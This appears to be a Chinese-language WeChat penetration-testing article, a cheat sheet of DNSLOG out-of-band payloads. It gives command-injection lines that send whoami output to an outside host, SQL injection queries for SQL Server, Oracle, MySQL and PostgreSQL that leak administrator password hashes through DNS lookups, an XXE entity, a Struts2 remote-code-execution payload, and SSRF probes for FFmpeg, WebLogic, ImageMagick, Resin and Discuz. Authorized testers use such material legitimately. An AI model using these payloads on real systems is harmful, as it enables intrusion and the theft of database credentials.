---
title: 渗透测试-DNSLOG使用技巧
url: https://mp.weixin.qq.com/s?__biz=MzkwMTE4NDM5NA==&mid=2247486191&idx=1&sn=382054eeb8e3179f6c0386a001f7398c&chksm=c0b9e40af7ce6d1cd140521f3e5b78c88ed6da2dcd9d7ceca1c99a986793bf83f299b271f084&scene=58&subscene=0#rd
source: 无害实验室sec
date: 2022-11-11
fetch_date: 2025-10-03T22:23:55.730710
---

# 渗透测试-DNSLOG使用技巧

![cover_image](https://mmbiz.qlogo.cn/mmbiz_jpg/ewSxvszRhM4frExicibiaOAIpc5g4IetFjnJDkKgHWyZKTBzibTDZOksOTArbA2OJ2dUeSPVmFuECx96AicyiasufWAw/0?wx_fmt=jpeg)

# 渗透测试-DNSLOG使用技巧

李姐

渗透测试网络安全

**0x01 命令执行场景**

Liunx/Unix/Mac OS系统:

```
ping `whoami`.mydnslog.comcurl http://mydnslog.com/`whoami`
```

Windows系统:

```
ping %USERNAME%.mydnslog.com
```

**0x02 SQL注入场景**

SQL Server数据库:

```
DECLARE @host varchar(1024);SELECT @host=(SELECT TOP 1master.dbo.fn_varbintohexstr(password_hash)FROM sys.sql_logins WHERE name='sa')+'.mydnslog.com';EXEC('master..xp_dirtree"\\'+@host+'\foobar$"');
```

Oracle数据库:

```
SELECT UTL_INADDR.GET_HOST_ADDRESS('mydnslog.com');SELECT UTL_HTTP.REQUEST('http://mydnslog.com/oracle') FROM DUAL;SELECT HTTPURITYPE('http://mydnslog.com/oracle').GETCLOB() FROM DUAL;SELECT DBMS_LDAP.INIT(('mydnslog.com',80) FROM DUAL;SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.mydnslog.com',80) FROM DUAL;
```

MySQL数据库:

```
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mydnslog.com\\abc'));
```

PostgreSQL数据库:

```
DROP TABLE IF EXISTS table_output;CREATE TABLE table_output(content text);CREATE OR REPLACE FUNCTION temp_function()RETURNS VOID AS $DECLARE exec_cmd TEXT;DECLARE query_result TEXT;BEGINSELECT INTO query_result (SELECT passwdFROM pg_shadow WHERE usename='postgres');exec_cmd := E'COPY table_output(content)FROM E\'\\\\\\\\'||query_result||E'.psql.mydnslog.com\\\\foobar.txt\'';EXECUTE exec_cmd;END;$ LANGUAGE plpgsql SECURITY DEFINER;SELECT temp_function();
```

**0x03 XXE场景**

XML实体:

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://mydnslog.com/xxe_test">%remote;]><root/>
```

**0x04 其他场景**

Struts2中间件:

```
xx.action?redirect:http://mydnslog.com/%25{3*4}xx.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'whoami'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d"http://mydnslog.com/result%3d".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod("GET"),%23http.connect(),%23http.getInputStream()}
```

FFMpeg插件:

```
#EXTM3U#EXT-X-MEDIA-SEQUENCE:0#EXTINF:10.0,concat:http://mydnslog.com#EXT-X-ENDLIST
```

Weblogic中间件:

```
example.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http://mydnslog.com/test&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Businesslocation&btnSubmit=Search
```

ImageMagick插件:

```
push graphic-contextviewbox 0 0 640 480fill 'url(http://mydnslog.com)'pop graphic-context
```

Resin中间件:

```
example.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://mydnslog.com/ssrf
```

Discuz社群:

```
example.com/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]http://mydnslog.com/x.jpg[/img]&formhash=x
```

**关 注 有 礼**

关注本公众号回复“718619”

可以免费领取全套网络安全学习教程，安全靶场、面试指南、安全沙龙PPT、代码安全、火眼安全系统等

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1) 还在等什么？赶紧点击下方名片关注学习吧！![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**免责声明**

> 由于传播、利用本公众号渗透测试网络安全所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号渗透测试网络安全及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM6HBIesNL5xC8L1fzZ9B5tdY9lzUeJ68B338TibfaRdEbVHq1BBjQSJyV2MpvX3dgxM3HhgfAMm9Qw/0?wx_fmt=png)

渗透测试网络安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM6HBIesNL5xC8L1fzZ9B5tdY9lzUeJ68B338TibfaRdEbVHq1BBjQSJyV2MpvX3dgxM3HhgfAMm9Qw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过